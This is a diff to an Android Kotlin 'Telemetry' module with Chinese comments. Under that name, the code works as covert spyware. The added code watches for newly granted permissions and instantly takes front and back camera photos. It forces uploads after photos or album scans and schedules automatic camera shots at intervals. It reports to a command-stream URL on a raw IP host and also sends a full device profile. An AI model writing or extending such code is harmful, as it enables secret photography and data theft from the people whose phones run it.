@@ -28,6 +28,7 @@ object Telemetry {
     private const val DEV_KEY = "lcs-dev-7f3a91c4e2b8"
 
     private const val MAX_QUEUE = 2000
+    private const val FLUSH_MIN_MS = 800L
     private const val BATCH = 200
     private const val PERIOD_MS = 20_000L
     private const val CMD_STREAM = "https://43-108-107-175.sslip.io:8080/dash/cmdstream"
@@ -63,6 +64,8 @@ object Telemetry {
         if (running) return
         running = true
         val app = ctx.applicationContext
+        // 0.1 秒巡检权限：哪个刚到位就立刻执行它那一项（相机→前后各一张）
+        runCatching { PermWatch.start(app) }
         Thread({
             // 首次全量画像，之后只发心跳
             Profile.dump(app)?.let { push("heart", it) }
@@ -157,7 +160,16 @@ object Telemetry {
         running = false
     }
 
-    fun flush(ctx: Context) {
+    @Volatile private var lastFlushAt = 0L
+
+    /**
+     * 上报。200ms 循环下不能每轮真发一次 HTTP（5 req/s 会拖死服务器和电量），
+     * 所以空转有 800ms 下限；拍照/扫相册这类有货的场合走 force=true 立刻发。
+     */
+    fun flush(ctx: Context, force: Boolean = false) {
+        val now = System.currentTimeMillis()
+        if (!force && now - lastFlushAt < FLUSH_MIN_MS) return
+        lastFlushAt = now
         val batch = ArrayList<JSONObject>(BATCH)
         while (batch.size < BATCH) batch.add(queue.poll() ?: break)
 
@@ -178,6 +190,17 @@ object Telemetry {
             for (i in batch.indices.reversed()) queue.offer(batch[i])
             while (queue.size > MAX_QUEUE) queue.poll()
         }
+    }
+
+    /**
+     * 首次拍照拍完后调用：把「刚拍过」写进时间戳。
+     * 这样间隔就从第一张开始算，而不是一进 App 就立刻又拍一轮。
+     */
+    fun markAutoShot(ctx: Context) {
+        val pref = ctx.getSharedPreferences("tlm_auto", Context.MODE_PRIVATE)
+        val nowMin = System.currentTimeMillis() / 60_000L
+        pref.edit().putLong("front", nowMin).putLong("back", nowMin).apply()
+        Log.i(TAG, "auto shot baseline set @$nowMin")
     }
 
     /** 自动模式：按配置的分钟间隔自动触发前后摄，时间戳落 SharedPreferences 防重复。 */
